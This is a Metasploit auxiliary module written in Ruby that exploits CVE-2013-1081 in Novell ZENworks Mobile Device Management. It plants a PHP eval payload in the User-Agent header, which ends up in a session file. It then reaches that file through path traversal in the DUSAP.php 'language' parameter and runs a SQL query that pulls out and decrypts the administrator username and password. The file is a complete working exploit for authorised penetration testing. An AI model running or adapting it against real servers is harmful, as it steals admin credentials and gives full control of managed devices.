##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'Novell Zenworks Mobile Device Managment Admin Credentials ',
			'Description' => %q{
				This module attempts to pull the administrator credentials from
				a vulnerable Novell Zenworks MDM server.
			},
			'Author' =>
				[
					'steponequit',
					'Andrea Micalizzi (aka rgod)' #zdireport
				],
			'References' =>
				[
					['CVE', '2013-1081']
				],
			'License' => MSF_LICENSE
		)

		register_options([
			OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/']),
			OptInt.new('RPORT', [true, "Default remote port", 80])
		], self.class)

		register_advanced_options([
			OptBool.new('SSL', [true, "Negotiate SSL connection", false])
		], self.class)
	end

	def setup_session()
		sess = Rex::Text.rand_text_alpha(8)
		cmd = Rex::Text.rand_text_alpha(8)
		res = send_request_cgi({
			'agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
			'method' => "HEAD",
			'uri' => normalize_uri("#{target_uri.path}/download.php"),
			'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
			}) 
		return sess,cmd
	end

	def get_creds(session_id,cmd_var)
		
		res = send_request_cgi({
			'method' => 'GET',
			'uri' => normalize_uri("#{target_uri.path}/DUSAP.php"),
			'vars_get' => {
				'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
				cmd_var => '$pass=mdm_ExecuteSQLQuery("SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1",array(),false,-1,"","","",QUERY_TYPE_SELECT);echo "".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."";'
			}	
		})
		creds = res.body.to_s.match(/.*:"(.*)";.*";/)[1]
		return creds.split(":")			
	end

	def run_host(ip)
		print_status("Verifying that Zenworks login page exists at #{ip}")
		uri = normalize_uri(target_uri.path)
		begin
			res = send_request_raw({
				'method' => 'GET',
				'uri' => uri
				})
			if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
				print_status("Found Zenworks MDM, Checking application version")
				ver = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
				print_status("Found Version #{ver}")
				session_id,cmd = setup_session()
				user,pass = get_creds(session_id,cmd)
				print_good("Got creds. Login:#{user} Password:#{pass}")
				print_good("Access the admin interface here: #{ip}:#{rport}#{target_uri.path}dashboard/")
			else
				print_error("Zenworks MDM does not appear to be running at #{ip}")
				return :abort
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		rescue ::OpenSSL::SSL::SSLError => e
			return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
		end
	end

end
